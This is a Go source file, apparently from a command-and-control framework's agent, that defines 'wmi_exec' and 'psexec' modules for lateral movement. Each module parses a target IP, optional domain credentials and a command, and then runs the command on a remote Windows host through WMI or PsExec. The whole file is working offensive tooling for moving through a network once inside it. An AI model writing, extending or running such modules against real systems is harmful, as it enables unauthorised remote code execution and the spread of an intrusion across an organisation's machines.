//go:build windows

package modules

import (
	"fmt"
	"runtime"
	"strings"

	"github.com/aegis-c2/aegis/agent/lateral"
)

// WMIExecModule 执行 WMI 远程命令。
// 用法: wmi_exec -target <ip> -user <domain\\user> -pass <password> -cmd <command>
// 简化用法: wmi_exec -target <ip> -cmd <command> (使用当前用户)
func WMIExecModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "wmi_exec only available on Windows", 1
	}

	target, user, pass, cmd := parseWMIArgs(args)
	if target == "" || cmd == "" {
		return "", "usage: wmi_exec -target <ip> -user <user> -pass <pass> -cmd <command>", 1
	}

	var pid uint32
	var err error

	if user != "" && pass != "" {
		pid, err = lateral.WMIExec(target, user, pass, cmd)
	} else {
		pid, err = lateral.WMIExecSimple(target, cmd)
	}

	if err != nil {
		return "", fmt.Sprintf("wmi_exec failed: %v", err), 1
	}

	return fmt.Sprintf("process created on %s (PID: %d)", target, pid), "", 0
}

// PsExecModule 执行 PsExec 远程命令。
// 用法: psexec -target <ip> -user <domain\\user> -pass <password> -cmd <command>
// 简化用法: psexec -target <ip> -cmd <command> (使用当前用户)
func PsExecModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "psexec only available on Windows", 1
	}

	target, user, pass, cmd := parseWMIArgs(args)
	if target == "" || cmd == "" {
		return "", "usage: psexec -target <ip> -user <user> -pass <pass> -cmd <command>", 1
	}

	output, err := lateral.PsExec(target, user, pass, cmd)
	if err != nil {
		return "", fmt.Sprintf("psexec failed: %v", err), 1
	}

	return output, "", 0
}

func parseWMIArgs(args string) (target, user, pass, cmd string) {
	parts := strings.Fields(args)
	for i := 0; i < len(parts); i++ {
		switch parts[i] {
		case "-target", "--target":
			if i+1 < len(parts) {
				i++
				target = parts[i]
			}
		case "-user", "--user":
			if i+1 < len(parts) {
				i++
				user = parts[i]
			}
		case "-pass", "--pass", "-password", "--password":
			if i+1 < len(parts) {
				i++
				pass = parts[i]
			}
		case "-cmd", "--cmd", "-command", "--command":
			if i+1 < len(parts) {
				i++
				cmd = parts[i]
				// 剩余参数都属于命令
				for i+1 < len(parts) {
					i++
					cmd += " " + parts[i]
				}
				return
			}
		}
	}
	return
}
